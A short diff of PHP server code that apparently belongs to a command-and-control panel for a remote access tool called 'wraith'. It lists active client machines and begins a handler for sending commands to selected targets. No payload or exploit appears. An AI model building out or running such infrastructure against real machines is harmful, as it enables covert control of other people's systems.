@@ -266,12 +266,18 @@ if ($response["requester_type"] === "wraith") {
 	} elseif ($req_type === "getwraiths") {
 		// Get a list of all wraiths and their attributes
 		$db = get_db();
+		$wraiths = $db["active_wraith_clients"];
+		$wraiths_dict = ["Wraith ID" => "Wraith Details"];
+		foreach ($db["active_wraith_clients"] as $id => $values) {
+			$wraiths_dict[$id] = json_encode($values, JSON_PRETTY_PRINT);
+		}
 		$response["status"] = "SUCCESS";
-		$response["data"] = json_encode(["test" => "testing"]);
+		$response["data"] = json_encode($wraiths_dict);
 		respond();
 		
 	} elseif ($req_type === "sendcommand") {
 		// Send a command to a/multiple wraith/s
+		$targets = $request["data"]["targets"];
 		respond();
 		
 	} elseif ($req_type === "settings") {
